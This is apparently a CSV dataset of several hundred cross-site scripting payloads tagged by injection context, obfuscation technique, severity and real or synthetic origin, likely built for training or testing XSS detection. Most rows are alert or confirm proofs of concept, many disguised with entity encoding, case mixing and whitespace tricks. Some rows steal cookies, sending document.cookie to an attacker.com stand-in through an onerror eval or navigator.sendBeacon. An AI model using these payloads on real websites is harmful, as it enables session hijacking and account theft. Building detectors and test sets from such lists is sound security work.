payload,context,technique,severity,length,source
javascr	ipt:confirm(1),js_uri,synthetic,medium,22,synthetic
""" %3E%3Csvg onanimationcancel=confirm(location.hash)%3E",attribute_escape,synthetic,medium,55,synthetic
\%22 onbegin=console.log(location.hash)//,attribute_escape,synthetic,medium,41,synthetic
' ><svg onw&#101;bkit&#97;nim&#97;tion&#101;nd=confirm('XSS')>,attribute_escape,synthetic,medium,62,synthetic
%27 onchange=console.log(1) %27,attribute_escape,synthetic,medium,31,synthetic
`><Img srC=x onBegIn=ConFirM(1)>,attribute_escape,synthetic,medium,32,synthetic
"<div draggable=""true"" contenteditable>drag me</div><input2 ondragover=alert(1) contenteditable style=display:block>drop here</input2>",tag_injection,none,medium,133,real
' onbeforecut=\u0061lert(document.domain) ',attribute_escape,synthetic,low,43,synthetic
""" ><svg onplaying=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
' onh&#97;shch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,low,72,synthetic
	onpointermove=\u0061lert(document.domain),event_handler,synthetic,low,42,synthetic
"\"" OnsEcuRitYpoLicYviOlaTioN=pRomPt(1)//",attribute_escape,synthetic,medium,40,synthetic
"\"" OncAnpLay=coNsoLe.Log(loCatIon.haSh)//",attribute_escape,synthetic,medium,41,synthetic
<t&#97;bl&#101; oncopy=confirm('XSS')>,tag_injection,synthetic,medium,38,synthetic
	onPagEhiDe=ProMpt(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;ov&#101;r"":confirm})",dom_sink,synthetic,low,64,synthetic
<svg><pre onload=alert(1)></pre>,tag_injection,none,medium,32,real
' ><svg on&#101;rror=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,39,synthetic
"<sup oncut=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",tag_injection,none,medium,57,real
onch&#97;ng&#101;=j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,77,synthetic
onwebkitfullscreenchange=javascript:\u0061lert(document.domain),event_handler,synthetic,low,63,synthetic
"__proto__[%22onpointerover%22]=confirm(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,69,synthetic
%27 onended=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
<script	>alert(document.domain)</script>,script_injection,synthetic,medium,40,synthetic
\' OndRop=coNfiRm(LocAtiOn.HasH)//,attribute_escape,synthetic,medium,34,synthetic
"setInterval(%22alert(1)%22,100)",dom_sink,synthetic,high,31,synthetic
"""%3E%3Cimg src=x onsearch=alert('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
<embed onpointerup=alert(1) style=display:block>AnonKryptiQuz</embed>,tag_injection,none,medium,69,real
"location=""javascript:console.log(document.domain)""",dom_sink,synthetic,high,50,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm(doCumEnt.coOkiE)>""",dom_sink,synthetic,high,70,synthetic
"""><base onkeydown=\u0061lert('XSS')>",tag_injection,synthetic,low,36,synthetic
"""><t&#101;mpl&#97;t&#101; on&#101;nd&#101;d=prompt('XSS')>",tag_injection,synthetic,medium,58,synthetic
""" %3E%3Csvg onanimationend=confirm(location.hash)%3E",attribute_escape,synthetic,medium,52,synthetic
"\"" onreset=\u0061lert('XSS')//",attribute_escape,synthetic,low,30,synthetic
""" onhashchange=\u0061lert('XSS') """,attribute_escape,synthetic,low,34,synthetic
oninput=prompt&#40;%27XSS%27&#41;,event_handler,synthetic,low,33,synthetic
"""%3E%3Cimg onreset=console.log(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
oncut=&#97;l&#101;rt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,54,synthetic
<input4 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
%3Ctd onend=console.log(document.domain)%3E,tag_injection,synthetic,medium,43,synthetic
"<meta onmouseenter=""alert(1)"">AnonKryptiQuz</meta>",tag_injection,none,medium,50,real
	onTraNsiTioNstArt=coNsoLe.Log(loCatIon.haSh),event_handler,synthetic,medium,45,synthetic
""" ><svg onscrollsnapchange=confirm('XSS')>",attribute_escape,synthetic,medium,42,synthetic
"document.write(""<img src=x onerror=eval('//attacker.com/?c='+document.cookie)>"")",dom_sink,synthetic,high,80,synthetic
%2sscript%2ualert()%2s/script%2u,generic,none,medium,32,real
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",generic,html_entity,high,113,real
"<img src=""abc"" onerror=""alert(1)"">",tag_injection,none,medium,34,real
"<ol onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,66,real
"' onhashchange=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,55,synthetic
"__proto__[""onb&#101;for&#101;cut""]=confirm(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,medium,68,synthetic
"onw&#101;bkit&#97;nim&#97;tion&#101;nd=prompt/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,89,synthetic
"""{EVENTHANDLER}=alert(1)",attribute_escape,none,medium,24,real
onmozfullscreenchange=javascript:prompt(location.hash),event_handler,synthetic,medium,54,synthetic
"eval(""fetch(document.cookie)"")",dom_sink,synthetic,high,30,synthetic
<samp onpointerup=alert(1) style=display:block>AnonKryptiQuz</samp>,tag_injection,none,medium,67,real
`><Img srC=x onTouCheNd=ProMpt('XSS')>,attribute_escape,synthetic,medium,38,synthetic
"(n&#101;w Function(""confirm(loc&#97;tion.h&#97;sh)""))();",dom_sink,synthetic,medium,56,synthetic
"<t&#101;mpl&#97;t&#101; onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,low,93,synthetic
"<summary onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,75,real
<x onxxx=1 onxxx=1,tag_injection,none,low,18,real
"<time draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,81,real
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,tag_injection,none,medium,64,real
onscroll&#101;nd=prompt/*x*/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,54,synthetic
ondr&#97;g&#101;nt&#101;r=j&#97;v&#97;script:prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,77,synthetic
"""><img src=x onpopst&#97;t&#101;=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,51,synthetic
""" onscrollsnapchange=confirm('XSS') """,attribute_escape,synthetic,medium,37,synthetic
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=print()></plaintext>",tag_injection,none,low,120,real
<script>eval(‘a\x6cert(1)’);</script>,dom_sink,encoding,low,37,real
A” autofocus onfocus=alert(“XSS”)//,event_handler,none,medium,35,real
"<video onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,69,real
"'><Img srC=x onWaiTinG=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
<img/src=x alt=confirm(1) onmouseover=eval(alt)>,dom_sink,encoding,medium,48,real
'><Img srC=x onPoiNteRmoVe=ProMpt(loCatIon.haSh)>,attribute_escape,synthetic,medium,49,synthetic
"onclos&#101;=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,86,synthetic
"<del onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,79,real
"<style>:target {color:red;}</style><small id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></small>",tag_injection,none,medium,114,real
"<IMG SRC=""jav&#x09;ascript:alert(7333);"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,41,real
"<center draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</center>",tag_injection,none,medium,90,real
onb&#101;for&#101;m&#97;tch=prompt/*x*/('XSS'),event_handler,synthetic,low,46,synthetic
"' ><svg onbegin=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
"'><Img srC=x onProMptDisMisS=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
\' OnpOinTerDowN=aLerT(dOcuMenT.dOmaIn)//,attribute_escape,synthetic,medium,41,synthetic
<tr onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<object oncontextmenu=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,55,real
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=eval('XSS')>"")",dom_sink,synthetic,low,73,synthetic
"""%3E%3Cimg src=x ongesturestart=alert(1)%3E",attribute_escape,synthetic,medium,43,synthetic
{{$On.ConStrUctOr('coNfiRm(1)')()}},template_injection,synthetic,medium,35,synthetic
"<output draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</output>",tag_injection,none,medium,88,real
`><Img srC=x onPauSe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,46,synthetic
java	script:alert('XSS'),js_uri,synthetic,medium,24,synthetic
"' oNinValId=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,52,synthetic
%3Canimatemotion src=x onwaiting=alert(location.hash)%3E,tag_injection,synthetic,medium,56,synthetic
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",tag_injection,none,medium,107,real
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,tag_injection,none,medium,61,real
"setTimeout(""confirm(1)"",0)",dom_sink,synthetic,medium,26,synthetic
"""><script+src=""https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)""></script>",script_injection,none,medium,130,real
"""><Img srC=x onTouChmOve=coNfiRm(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,50,synthetic
\' OnsEcuRitYpoLicYviOlaTioN=cOnsOle.loG('XSS')//,attribute_escape,synthetic,medium,49,synthetic
\%22 onplay=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,32,synthetic
"<BASE HREF=""javascript:alert('AnonKryptiQuz');//"">",js_uri,case_variation,medium,50,real
"__proto__[""onb&#101;for&#101;cut""]=consol&#101;.log(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,low,77,synthetic
"document.write(""%3Cimg src=x onerror=prompt(document.domain)%3E"")",dom_sink,synthetic,medium,65,synthetic
onhashchange=alert(location.hash),event_handler,synthetic,medium,33,synthetic
%3Cbody	oninvalid=alert(location.hash)%3E,tag_injection,synthetic,medium,41,synthetic
OnfOcuSouT=jAvaScrIpt:coNfiRm(1),event_handler,synthetic,medium,32,synthetic
"""%3E%3Ctr ontransitionend=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,66,synthetic
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionend=alert(1)></i>",tag_injection,none,medium,100,real
"<thead draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,88,real
<svg><picture onload=alert(1)></picture>,tag_injection,none,medium,40,real
%3Cbase	ongestureend=console.log(document.domain)%3E,tag_injection,synthetic,medium,52,synthetic
onreset=alert&#40;document.domain&#41;,event_handler,synthetic,low,38,synthetic
<form onpagereveal=console.log(location.hash)>,tag_injection,synthetic,medium,46,synthetic
"data:text/html,<scr	ipt>alert(location.hash)</scr	ipt>",js_uri,synthetic,medium,54,synthetic
\' onbeforecut=console.log(1)//,attribute_escape,synthetic,medium,31,synthetic
"%22 onbeforetoggle=alert(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,59,synthetic
""" onblur=alert(document.domain) """,attribute_escape,synthetic,medium,33,synthetic
"\"" OnaNimAtiOneNd=ConFirM(1)//",attribute_escape,synthetic,medium,30,synthetic
""" oNanImaTioNenD=cOnfIrm(loCatIon.haSh) """,attribute_escape,synthetic,medium,41,synthetic
><s %2b cript>alert(document.cookie)</script>,dom_sink,url_encoding,high,45,real
"""%3E%3Cimg src=x onauxclick=console.log(1)%3E",attribute_escape,synthetic,medium,45,synthetic
"LocAtiOn=""jaVasCriPt:ProMpt(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))""",dom_sink,synthetic,high,84,synthetic
"eval(""eval(btoa(document.cookie))"")",dom_sink,synthetic,high,35,synthetic
"\' onk&#101;ypr&#101;ss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,82,synthetic
%3Cscript%3E//alert(location.hash)%3C/script%3E,script_injection,synthetic,medium,47,synthetic
\' oninput=console.log(document.domain)//,attribute_escape,synthetic,medium,41,synthetic
"\"" onpopstate=\u0061lert(1)//",attribute_escape,synthetic,low,29,synthetic
"<menuitem id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></menuitem>",tag_injection,none,medium,92,real
<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>,tag_injection,none,medium,72,real
OnmOusEdoWn=ConSolE.lOg&#40;'XSS'&#41;,event_handler,synthetic,low,38,synthetic
<dt onpointerenter=alert(1) style=display:block>AnonKryptiQuz</dt>,tag_injection,none,medium,66,real
<body x=y onpointermove=alert(location.hash)>,tag_injection,synthetic,medium,45,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#101;v&#97;l(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,low,124,synthetic
%3C!--%3E%3Ctextarea onscrollend=alert('XSS')%3E,tag_injection,synthetic,medium,48,synthetic
"<command draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</command>",tag_injection,none,medium,70,real
' ><svg ongotpointercapture=alert(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
"<isindex onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",tag_injection,none,medium,71,real
<strike onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
`><Img srC=x onEndEd=ConSolE.lOg(1)>,attribute_escape,synthetic,medium,36,synthetic
"<blockquote draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,97,real
&quot; onpaste=console.log(1) x=&quot;,attribute_escape,synthetic,medium,38,synthetic
<!--><m&#97;th oncopy=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,65,synthetic
<scr	ipt>//alert('XSS')</scr	ipt>,script_injection,synthetic,medium,33,synthetic
""" onbeforepaste=prompt(1) """,attribute_escape,synthetic,medium,27,synthetic
<tr onanimationend=prompt(%27XSS%27) onanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,70,synthetic
%3Ctemplate	oncontextmenu=console.log(1)%3E,tag_injection,synthetic,medium,43,synthetic
"element.setAttribute(""onclick"",""eval('XSS')"")",dom_sink,synthetic,low,45,synthetic
"OnpRomPtdIsmIss=coNsoLe.Log/**/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,62,synthetic
"<a href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</a>",js_uri,html_entity|comment_injection|url_encoding,medium,198,real
' ><svg onpoint&#101;rmov&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,66,synthetic
<obJecT oNmoZfuLlsCreEncHanGe=ConSolE.lOg(1)>,tag_injection,synthetic,medium,45,synthetic
' ><svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,52,synthetic
"<deTaiLs
OnrEpeAt=ProMpt(1)>",tag_injection,synthetic,medium,28,synthetic
\%27 oncut=console.log(1)//,attribute_escape,synthetic,medium,27,synthetic
<img onerror=a&#x06c;ert(1) src=a>,tag_injection,html_entity,low,34,real
"""><img src=x onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,97,synthetic
"<xmp draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,84,real
<button popovertarget=x>Click me</button><input4 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</input4>,tag_injection,none,medium,108,real
<!--><obj&#101;ct onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,95,synthetic
"<blInk
onPagEhiDe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,high,57,synthetic
<w contenteditable id=x onfocus=alert()>,tag_injection,none,medium,40,real
onpageshow=javascript:\u0061lert('XSS'),event_handler,synthetic,low,39,synthetic
\%27 onbeforepaste=alert(1)//,attribute_escape,synthetic,medium,29,synthetic
"<sup onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",tag_injection,none,medium,61,real
"""><Img srC=x onPagEshOw=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,51,synthetic
<di&#97;log onp&#97;g&#101;hid&#101;=consol&#101;.log(1)/>,tag_injection,synthetic,low,58,synthetic
"<font onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,69,real
"<area onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></area>",tag_injection,none,medium,281,real
"<noembed draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,87,real
"Obj&#101;ct.&#97;ssign(window,{""ondblclick"":confirm})",dom_sink,synthetic,low,53,synthetic
<embed src=/ onload=alert(1)>,tag_injection,none,medium,29,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#101;v&#97;l(docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,low,109,synthetic
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",tag_injection,none,medium,107,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""confirm(docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,medium,103,synthetic
%22><script onclick=prompt(%27XSS%27)>,tag_injection,synthetic,medium,38,synthetic
"__proto__[""ontouchmove""]=\u0061lert(document.domain)",dom_sink,synthetic,low,52,synthetic
	onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS'),event_handler,synthetic,medium,55,synthetic
<header id=x tabindex=1 onactivate=alert(1)></header>,tag_injection,none,medium,53,real
"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",generic,none,medium,71,real
\' ontransitionstart=confirm(document.domain)//,attribute_escape,synthetic,medium,47,synthetic
"`><img src=x onplaying=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"%3Cset
onwebkitfullscreenchange=console.log('XSS')%3E",tag_injection,synthetic,medium,53,synthetic
<svg onload=prompt%26%230000000040document.domain)>,dom_sink,url_encoding,low,51,real
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onwebkitanimationend=""alert(1)""></menu>",tag_injection,none,medium,99,real
